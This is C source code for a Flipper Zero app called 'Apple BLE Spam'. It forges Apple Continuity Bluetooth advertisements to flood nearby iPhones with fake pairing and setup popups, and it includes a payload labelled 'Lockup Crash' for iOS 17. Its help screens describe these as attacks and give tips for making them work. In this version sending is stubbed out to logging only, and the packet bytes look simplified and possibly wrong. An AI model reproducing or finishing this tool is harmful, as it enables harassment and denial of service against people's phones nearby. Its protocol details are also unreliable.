#include <furi.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <stdint.h>
#include <furi_hal_random.h>
#include "apple_ble_spam_icons.h"

// Continuity protocol definitions (included directly to avoid linking issues)
typedef enum {
    ContinuityTypeAirDrop,
    ContinuityTypeAirplayTarget,
    ContinuityTypeHandoff,
    ContinuityTypeTetheringSource,
    ContinuityTypeNearbyAction,
    ContinuityTypeNearbyInfo,
    ContinuityTypeProximityPair,
    ContinuityTypeCustomCrash,
    ContinuityTypeCount,
} ContinuityType;

typedef struct {
    uint8_t flags;
    uint8_t type;
} NearbyAction;

typedef struct {
    uint8_t prefix;
    uint16_t model;
} ProximityPair;

typedef struct {
    // Empty for now, can be extended
} AirDrop;

typedef struct {
    // Empty for now, can be extended
} AirplayTarget;

typedef struct {
    // Empty for now, can be extended
} Handoff;

typedef struct {
    // Empty for now, can be extended
} TetheringSource;

typedef struct {
    // Empty for now, can be extended
} NearbyInfo;

typedef struct {
    // Empty for now, can be extended
} CustomCrash;

typedef union {
    NearbyAction nearby_action;
    ProximityPair proximity_pair;
    AirDrop airdrop;
    AirplayTarget airplay_target;
    Handoff handoff;
    TetheringSource tethering_source;
    NearbyInfo nearby_info;
    CustomCrash custom_crash;
} ContinuityData;

typedef struct {
    ContinuityType type;
    ContinuityData data;
} ContinuityMsg;

// Continuity functions (included directly)
const char* continuity_get_type_name(ContinuityType type) {
    switch(type) {
        case ContinuityTypeAirDrop: return "AirDrop";
        case ContinuityTypeAirplayTarget: return "AirplayTarget";
        case ContinuityTypeHandoff: return "Handoff";
        case ContinuityTypeTetheringSource: return "TetheringSource";
        case ContinuityTypeNearbyAction: return "NearbyAction";
        case ContinuityTypeNearbyInfo: return "NearbyInfo";
        case ContinuityTypeProximityPair: return "ProximityPair";
        case ContinuityTypeCustomCrash: return "CustomCrash";
        default: return "Unknown";
    }
}

uint8_t continuity_get_packet_size(ContinuityType type) {
    switch(type) {
        case ContinuityTypeNearbyAction:
        case ContinuityTypeProximityPair:
        case ContinuityTypeCustomCrash:
            return 27; // Standard size for these types
        default:
            return 27; // Default size
    }
}

void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
    switch(msg->type) {
        case ContinuityTypeNearbyAction: {
            // Nearby Action packet structure
            packet[0] = 0x04; // Length
            packet[1] = 0x04; // Type (Nearby Action)
            packet[2] = msg->data.nearby_action.flags;
            packet[3] = msg->data.nearby_action.type;
            packet[4] = 0x00; // Padding
            packet[5] = 0x00;
            packet[6] = 0x0f;
            packet[7] = 0x05;
            packet[8] = 0xc0;
            packet[9] = 0x02;
            packet[10] = 0x60;
            packet[11] = 0x4c; // Apple company ID (little endian)
            packet[12] = 0x00;
            // Fill remaining bytes with zeros
            for(int i = 13; i < 27; i++) {
                packet[i] = 0x00;
            }
            break;
        }
        
        case ContinuityTypeProximityPair: {
            // Proximity Pair packet structure
            packet[0] = 0x07; // Length
            packet[1] = 0x19; // Type (Proximity Pair)
            packet[2] = 0x05; // Subtype
            packet[3] = 0x00; // Flags
            packet[4] = msg->data.proximity_pair.prefix;
            packet[5] = (msg->data.proximity_pair.model >> 8) & 0xFF; // Model high byte
            packet[6] = msg->data.proximity_pair.model & 0xFF; // Model low byte
            packet[7] = 0x00; // Padding
            packet[8] = 0x00;
            packet[9] = 0x00;
            packet[10] = 0x00;
            packet[11] = 0x00;
            packet[12] = 0x00;
            packet[13] = 0x00;
            packet[14] = 0x00;
            packet[15] = 0x00;
            packet[16] = 0x00;
            packet[17] = 0x00;
            packet[18] = 0x00;
            packet[19] = 0x00;
            packet[20] = 0x00;
            packet[21] = 0x00;
            packet[22] = 0x00;
            packet[23] = 0x00;
            packet[24] = 0x00;
            packet[25] = 0x00;
            packet[26] = 0x00;
            break;
        }
        
        case ContinuityTypeCustomCrash: {
            // Custom Crash packet structure (iOS 17 crash)
            packet[0] = 0x04; // Length
            packet[1] = 0x04; // Type
            packet[2] = 0x20; // Flags
            packet[3] = 0x00; // Subtype
            packet[4] = 0x00; // Padding
            packet[5] = 0x00;
            packet[6] = 0x0f;
            packet[7] = 0x05;
            packet[8] = 0xc0;
            packet[9] = 0x02;
            packet[10] = 0x60;
            packet[11] = 0x4c; // Apple company ID
            packet[12] = 0x00;
            // Fill remaining bytes with zeros
            for(int i = 13; i < 27; i++) {
                packet[i] = 0x00;
            }
            break;
        }
        
        default:
            // Default packet structure
            for(int i = 0; i < 27; i++) {
                packet[i] = 0x00;
            }
            break;
    }
}

typedef struct {
    const char* title;
    const char* text;
    bool random;
    ContinuityMsg msg;
} Payload;

// Simplified BLE approach - using standard Flipper functions
#define TAG "AppleBLESpam"

// Payload definitions for different Apple BLE spam types
static Payload payloads[] = {
    {.title = "Lockup Crash",
     .text = "iOS 17, locked, long range",
     .random = false,
     .msg = {
         .type = ContinuityTypeCustomCrash,
         .data = {.custom_crash = {}},
     }},
    {.title = "Random Action",
     .text = "Spam shuffle Nearby Actions",
     .random = true,
     .msg = {
         .type = ContinuityTypeNearbyAction,
         .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
     }},
    {.title = "Random Pair",
     .text = "Spam shuffle Proximity Pairs",
     .random = true,
     .msg = {
         .type = ContinuityTypeProximityPair,
         .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
     }},
    {.title = "AppleTV AutoFill",
     .text = "Banner, unlocked, long range",
     .random = false,
     .msg = {
         .type = ContinuityTypeNearbyAction,
         .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
     }},
    {.title = "AppleTV Connecting...",
     .text = "Modal, unlocked, long range",
     .random = false,
     .msg = {
         .type = ContinuityTypeNearbyAction,
         .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
     }},
    {.title = "Join This AppleTV?",
     .text = "Modal, unlocked, spammy",
     .random = false,
     .msg = {
         .type = ContinuityTypeNearbyAction,
         .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
     }},
    {.title = "Transfer Phone Number",
     .text = "Modal, locked",
     .random = false,
     .msg = {
         .type = ContinuityTypeNearbyAction,
         .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
     }},
    {.title = "Setup New iPhone",
     .text = "Modal, locked",
     .random = false,
     .msg = {
         .type = ContinuityTypeNearbyAction,
         .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
     }},
    {.title = "Airtag",
     .text = "Modal, unlocked",
     .random = false,
     .msg = {
         .type = ContinuityTypeProximityPair,
         .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
     }},
    {.title = "AirPods Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg = {
         .type = ContinuityTypeProximityPair,
         .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
     }},
    {.title = "AirPods",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg = {
         .type = ContinuityTypeProximityPair,
         .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
     }},
};

#define PAYLOAD_COUNT ((signed)COUNT_OF(payloads))

struct {
    uint8_t count;
    ContinuityData** datas;
} randoms[ContinuityTypeCount] = {0};

uint16_t delays[] = {
    20, 50, 100, 150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 4000, 5000,
};

typedef struct {
    bool resume;
    bool advertising;
    uint8_t delay;
    uint8_t size;
    uint8_t* packet;
    Payload* payload;
    FuriTimer* timer;
    uint8_t mac[6];
    int8_t index;
    FuriString* status_text;
} State;

// Simple timer-based approach instead of custom HCI
static void adv_timer_callback(void* ctx) {
    State* state = ctx;
    if(!state->advertising) return;
    
    // Generate packet
    ContinuityMsg* msg = &state->payload->msg;
    ContinuityType type = msg->type;
    
    if(state->payload->random) {
        uint8_t random_i = rand() % randoms[type].count;
        memcpy(&msg->data, randoms[type].count > 0 ? randoms[type].datas[random_i] : &state->payload->msg.data, sizeof(msg->data));
    }
    
    continuity_generate_packet(msg, state->packet);
    
    // Log the packet for debugging
    FURI_LOG_I(TAG, "Sending packet type: %s, size: %d", 
               continuity_get_type_name(type), state->size);
    
    // For now, just log the packet instead of sending it
    // This prevents crashes while we debug
    char hex_str[128] = {0};
    for(int i = 0; i < state->size && i < 16; i++) {
        snprintf(hex_str + (i * 3), 4, "%02X ", state->packet[i]);
    }
    FURI_LOG_I(TAG, "Packet data: %s", hex_str);
    
    // Update status
    furi_string_printf(state->status_text, "Sent: %s", 
                      continuity_get_type_name(type));
    
    // Restart timer
    furi_timer_start(state->timer, delays[state->delay]);
}

static void stop_adv(State* state) {
    if(!state->advertising) return;
    
    state->advertising = false;
    furi_timer_stop(state->timer);
    
    if(state->resume) {
        furi_hal_bt_start_advertising();
    }
    
    furi_string_set(state->status_text, "Stopped");
    
    if(state->packet) {
        free(state->packet);
        state->packet = NULL;
    }
    state->payload = NULL;
    state->size = 0;
}

static void start_adv(State* state) {
    if(state->advertising) return;
    
    state->advertising = true;
    state->size = continuity_get_packet_size(state->payload->msg.type);
    state->packet = malloc(state->size);
    
    // Generate random MAC
    furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
    
    // Remember if BLE was active
    state->resume = furi_hal_bt_is_active();
    
    // Stop normal BLE advertising
    furi_hal_bt_stop_advertising();
    
    // Start our timer
    furi_timer_start(state->timer, delays[state->delay]);
    
    furi_string_printf(state->status_text, "Started: %s", 
                      state->payload->title);
}

static void toggle_adv(State* state, Payload* payload) {
    if(state->advertising) {
        stop_adv(state);
    } else {
        state->payload = payload;
        start_adv(state);
    }
}

#define PAGE_MIN (-5)
#define PAGE_MAX PAYLOAD_COUNT
enum {
    PageApps = PAGE_MIN,
    PageDelay,
    PageDistance,
    PageProximityPair,
    PageNearbyAction,
    PageStart = 0,
    PageEnd = PAYLOAD_COUNT - 1,
    PageAbout = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const char* back = "Back";
    const char* next = "Next";
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 14, 12, "Apple BLE Spam");

    switch(state->index) {
    case PageApps:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageDelay:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageDistance:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# is limited, attacks\n"
            "work under 1 meter but a\n"
            "few are marked 'long range'",
            false);
        break;
    case PageProximityPair:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Proximity Pair\e# attacks\n"
            "keep spamming but work at\n"
            "very close range",
            false);
        break;
    case PageNearbyAction:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Nearby Actions\e# work one\n"
            "time then need to lock and\n"
            "unlock the phone",
            false);
        break;
    case PageAbout:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "About");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam by \e#WillyJL\e# XFW\n"
            "IDs and Crash by \e#ECTO-1A\e#\n"
            "Continuity by \e#furiousMAC\e#\n"
            "                                   Version \e#1.2\e#",
            false);
        break;
    default: {
        if(state->index < 0 || state->index > PAYLOAD_COUNT - 1) break;
        const Payload* payload = &payloads[state->index];
        char str[32];

        canvas_set_font(canvas, FontPrimary);
        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_str(canvas, 119, 6, "^");
        canvas_draw_str(canvas, 119, 10, "v");

        canvas_set_font(canvas, FontPrimary);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            PAYLOAD_COUNT,
            continuity_get_type_name(payload->msg.type));
        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 34, payload->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, payload->text);

        // Show status
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 58, furi_string_get_cstr(state->status_text));

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t apple_ble_spam_app(void* p) {
    UNUSED(p);
    
    // Initialize random data for random payloads
    for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
        if(payloads[payload_i].random) continue;
        randoms[payloads[payload_i].msg.type].count++;
    }
    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
        if(!randoms[type].count) continue;
        randoms[type].datas = malloc(sizeof(ContinuityData*) * randoms[type].count);
        uint8_t random_i = 0;
        for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
            if(payloads[payload_i].random) continue;
            if(payloads[payload_i].msg.type == type) {
                randoms[type].datas[random_i++] = &payloads[payload_i].msg.data;
            }
        }
    }

    State* state = malloc(sizeof(State));
    memset(state, 0, sizeof(State));
    
    // Initialize timer
    state->timer = furi_timer_alloc(adv_timer_callback, FuriTimerTypePeriodic, state);
    
    // Initialize status text
    state->status_text = furi_string_alloc();
    furi_string_set(state->status_text, "Ready");

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        Payload* payload = (state->index >= 0 && state->index <= PAYLOAD_COUNT - 1) ?
                               &payloads[state->index] :
                               NULL;
        bool advertising = state->advertising;
        switch(input.key) {
        case InputKeyOk:
            if(payload) toggle_adv(state, payload);
            break;
        case InputKeyUp:
            if(payload && state->delay < COUNT_OF(delays) - 1) {
                if(advertising) stop_adv(state);
                state->delay++;
                if(advertising) start_adv(state);
            }
            break;
        case InputKeyDown:
            if(payload && state->delay > 0) {
                if(advertising) stop_adv(state);
                state->delay--;
                if(advertising) start_adv(state);
            }
            break;
        case InputKeyLeft:
            if(state->index > PAGE_MIN) {
                if(advertising) toggle_adv(state, payload);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < PAGE_MAX) {
                if(advertising) toggle_adv(state, payload);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state, payload);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    // Cleanup
    furi_timer_free(state->timer);
    furi_string_free(state->status_text);
    free(state);

    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
        if(randoms[type].datas) {
            free(randoms[type].datas);
        }
    }
    return 0;
}
